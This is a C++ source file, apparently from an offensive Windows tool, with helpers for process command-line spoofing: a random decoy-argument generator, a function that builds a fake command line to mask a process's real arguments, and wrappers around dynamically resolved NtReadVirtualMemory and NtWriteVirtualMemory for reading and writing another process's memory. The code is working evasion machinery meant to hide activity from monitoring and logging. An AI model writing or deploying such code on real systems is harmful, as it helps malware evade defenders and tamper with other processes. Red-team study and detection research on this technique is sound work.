#include "Headers.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-===-==-==-==-==-==-==-==-==-==-===-==-==-==-==-==-==-==-==-==-==
// Extern Global (Defined in 'ResolvePrgrmAPIs.cpp')

extern DINMCLY_RSOLVD_FUNCTIONS g_ResolvedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN LPWSTR SourceString)
{
    SIZE_T cbLength = 0x00;

    if (SourceString != NULL)
    {
        while (SourceString[cbLength] != L'\0')
        {
            cbLength++;
            if (cbLength >= (MAXUSHORT / sizeof(WCHAR)))
            {
                cbLength = (MAXUSHORT / sizeof(WCHAR)) - 1;
                break;
            }
        }
    }

    DestinationString->Buffer           = (PWCHAR)SourceString;
    DestinationString->Length           = (USHORT)(cbLength * sizeof(WCHAR));
    DestinationString->MaximumLength    = (USHORT)((cbLength + 1) * sizeof(WCHAR));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static LPWSTR GenerateSpoofedStringW(IN SIZE_T cbBaseLength)
{
    SIZE_T  cbSpoofedLen    = 0x00;
    LPWSTR  szSpoofedStr    = NULL;
    DWORD   dwSeed          = 0x00;

    // Spoofed string length = base length + random padding (16-64 chars)
    dwSeed       = (DWORD)(__rdtsc() ^ GetTickCount64());
    cbSpoofedLen = cbBaseLength + (dwSeed % 49) + 16;

    if (!(szSpoofedStr = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (cbSpoofedLen + 1) * sizeof(WCHAR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    // Generate random string content
    for (SIZE_T i = 0; i < cbSpoofedLen; i++)
    {
        dwSeed = dwSeed * 1103515245 + 12345;

        if ((dwSeed % 8) == 0)
        {
            szSpoofedStr[i] = L' ';
        }
        else
        {
            DWORD charType = (dwSeed >> 8) % 3;

            if (charType == 0)
                szSpoofedStr[i] = L'A' + ((dwSeed >> 16) % 26);
            else if (charType == 1)
                szSpoofedStr[i] = L'a' + ((dwSeed >> 16) % 26);
            else
                szSpoofedStr[i] = L'0' + ((dwSeed >> 16) % 10);
        }
    }

    szSpoofedStr[cbSpoofedLen] = L'\0';

    return szSpoofedStr;
}


LPWSTR GenerateFakeCommandLine(IN LPCWSTR szRealCommandLine, IN LPCWSTR szProcessPath)
{
    SIZE_T  cbRealLen       = 0x00,
            cbPathLen       = 0x00,
            cbTotalLen      = 0x00;
    LPWSTR  szFakeCmd       = NULL,
            szSpoofedArgs   = NULL;
    HRESULT hResults        = S_OK;

    if (!szRealCommandLine || !szProcessPath)
        return NULL;

    cbRealLen = lstrlenW(szRealCommandLine);
    cbPathLen = lstrlenW(szProcessPath);

    // Generate spoofed arguments based on real command line length
    if (!(szSpoofedArgs = GenerateSpoofedStringW(cbRealLen)))
        return NULL;

    // Total = quote + path + quote + space + spoofed args + null
    cbTotalLen = 1 + cbPathLen + 1 + 1 + lstrlenW(szSpoofedArgs) + 1;

    if (!(szFakeCmd = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotalLen * sizeof(WCHAR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        HeapFree(GetProcessHeap(), 0, szSpoofedArgs);
        return NULL;
    }

    // Build fake command line: "path" + spoofed args
    if (FAILED((hResults = StringCbPrintfW(szFakeCmd, cbTotalLen * sizeof(WCHAR), L"\"%s\" %s", szProcessPath, szSpoofedArgs))))
    {
        DBGA("[!] StringCbPrintfW Failed With Error: 0x%0.8X", hResults);
        HeapFree(GetProcessHeap(), 0, szFakeCmd);
        HeapFree(GetProcessHeap(), 0, szSpoofedArgs);
        return NULL;
    }

    HeapFree(GetProcessHeap(), 0, szSpoofedArgs);

    return szFakeCmd;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL NtReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID pBuffer, IN SIZE_T cbSize)
{
    NTSTATUS    ntStatus        = STATUS_SUCCESS;
    SIZE_T      cbBytesRead     = 0x00;

    if (!g_ResolvedFunctions.pInitialized || !hProcess || !pAddress || !pBuffer || !cbSize)
        return FALSE;

    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtReadVirtualMemory(hProcess, pAddress, pBuffer, cbSize, &cbBytesRead))) || cbBytesRead != cbSize)
    {
        DBGA("[!] NtReadVirtualMemory [0x%p] Failed With Error: 0x%0.8X", pAddress, ntStatus);
        DBGA("[i] Read %lu Bytes Instead Of %lu", (DWORD)cbBytesRead, (DWORD)cbSize);
        return FALSE;
    }

    return (cbBytesRead == cbSize);
}


BOOL NtWriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN SIZE_T cbSize)
{
    NTSTATUS    ntStatus        = STATUS_SUCCESS;
    SIZE_T      cbBytesWritten  = 0x00;

    if (!g_ResolvedFunctions.pInitialized || !hProcess || !pAddress || !pBuffer || !cbSize)
        return FALSE;

    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtWriteVirtualMemory(hProcess, pAddress, pBuffer, cbSize, &cbBytesWritten))) || cbBytesWritten != cbSize)
    {
        DBGA("[!] NtWriteVirtualMemory [0x%p] Failed With Error: 0x%0.8X", pAddress, ntStatus);
        DBGA("[i] Wrote %lu Bytes Instead Of %lu", (DWORD)cbBytesWritten, (DWORD)cbSize);
        return FALSE;
    }

    return (cbBytesWritten == cbSize);
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
